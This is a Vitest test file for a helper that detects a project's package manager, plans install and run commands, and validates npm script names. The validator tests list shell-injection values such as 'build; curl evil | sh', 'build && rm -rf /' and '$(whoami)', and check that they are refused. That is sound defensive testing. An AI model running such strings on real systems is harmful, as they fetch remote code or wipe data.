import { describe, it, expect } from 'vitest';
import {
  decideScript,
  detectPackageManager,
  installPlan,
  isSafeScriptName,
  readPackageManagerField,
  readPackageScripts,
  runPlan,
} from './npmProject';

describe('which package manager builds this project', () => {
  it('reads it from the lockfile', () => {
    expect(detectPackageManager(['package.json', 'pnpm-lock.yaml']).id).toBe('pnpm');
    expect(detectPackageManager(['yarn.lock']).id).toBe('yarn');
    expect(detectPackageManager(['package-lock.json']).id).toBe('npm');
  });

  /**
   * A leftover `package-lock.json` after moving to pnpm is common, and picking
   * npm there lays out a different dependency tree than the project expects.
   */
  it('prefers pnpm when both lockfiles are lying around', () => {
    expect(detectPackageManager(['package-lock.json', 'pnpm-lock.yaml']).id).toBe('pnpm');
  });

  it('lets the packageManager field outrank a stale lockfile', () => {
    const found = detectPackageManager(['package-lock.json'], 'pnpm@9.0.0');
    expect(found.id).toBe('pnpm');
    expect(found.hasLockfile).toBe(false);
  });

  /** No lockfile is not "npm" — it is "nobody said", and the interface should say so. */
  it('marks a bare guess as a guess', () => {
    const guess = detectPackageManager(['package.json']);
    expect(guess.id).toBe('npm');
    expect(guess.detected).toBe(false);
  });
});

describe('installing', () => {
  it('installs exactly from the lockfile when there is one', () => {
    expect(installPlan('npm', true).args).toEqual(['ci']);
    expect(installPlan('pnpm', true).args).toEqual(['install', '--frozen-lockfile']);
    expect(installPlan('yarn', true).args).toEqual(['install', '--immutable']);
    expect(installPlan('bun', true).args).toEqual(['install', '--frozen-lockfile']);
  });

  it('resolves versions afresh without one, and says so', () => {
    const plan = installPlan('pnpm', false);
    expect(plan.args).toEqual(['install']);
    expect(plan.note).toMatch(/blokady/);
  });

  // npm leaves out devDependencies when NODE_ENV=production is in the air.
  it('asks npm for the dev dependencies too', () => {
    expect(installPlan('npm', false).args).toEqual(['install', '--include=dev']);
  });
});

describe('running a script', () => {
  it('uses the form each tool documents', () => {
    expect(runPlan('npm', 'build').args).toEqual(['run', 'build']);
    expect(runPlan('pnpm', 'build').args).toEqual(['run', 'build']);
    expect(runPlan('yarn', 'build').args).toEqual(['build']);
  });
});

describe('the scripts of a package.json', () => {
  it('reads them', () => {
    expect(readPackageScripts('{"scripts":{"dev":"vite"}}')).toEqual({ dev: 'vite' });
  });

  /** "Cannot read the file" and "the project has no scripts" are different answers. */
  it('tells a broken file from one with no scripts', () => {
    expect(readPackageScripts('{ nie json')).toBeNull();
    expect(readPackageScripts('{"name":"x"}')).toEqual({});
  });

  it('ignores entries that are not commands', () => {
    expect(readPackageScripts('{"scripts":{"dev":"vite","x":{"nested":true}}}')).toEqual({
      dev: 'vite',
    });
  });

  it('picks up the declared manager', () => {
    expect(readPackageManagerField('{"packageManager":"pnpm@9.0.0"}')).toBe('pnpm@9.0.0');
    expect(readPackageManagerField('{"name":"x"}')).toBeUndefined();
  });
});

describe('what may be run', () => {
  it('takes the names npm actually uses', () => {
    for (const name of ['build', 'test:unit', 'build-web', 'a.b']) {
      expect(isSafeScriptName(name), name).toBe(true);
    }
  });

  /**
   * The name reaches a shell on the far side of this. `build; curl evil | sh`
   * as a script name is the whole reason the check exists.
   */
  it('refuses anything a shell would read as more than a name', () => {
    for (const name of [
      'build; curl evil | sh',
      'build && rm -rf /',
      '$(whoami)',
      'a b',
      '`x`',
      '',
    ]) {
      expect(isSafeScriptName(name), name).toBe(false);
    }
  });

  it('plans a script the file defines', () => {
    const decision = decideScript('build', { build: 'vite build' }, 'pnpm');
    expect(decision).toEqual({ ok: true, plan: { command: 'pnpm', args: ['run', 'build'] } });
  });

  /**
   * The shape is checked before the file is consulted: the user edits
   * `package.json` in this very drive, so a name found there proves nothing.
   */
  it('refuses a dangerous name even when package.json declares it', () => {
    const decision = decideScript('build; rm -rf /', { 'build; rm -rf /': 'x' }, 'npm');
    expect(decision.ok).toBe(false);
  });

  it('names what is available when the script is not there', () => {
    const decision = decideScript('start', { dev: 'vite', build: 'vite build' }, 'npm');
    expect(decision.ok).toBe(false);
    if (!decision.ok) expect(decision.reason).toContain('build, dev');
  });

  it('says the file could not be read rather than blaming the script', () => {
    const decision = decideScript('build', null, 'npm');
    expect(decision.ok).toBe(false);
    if (!decision.ok) expect(decision.reason).toContain('package.json');
  });
});
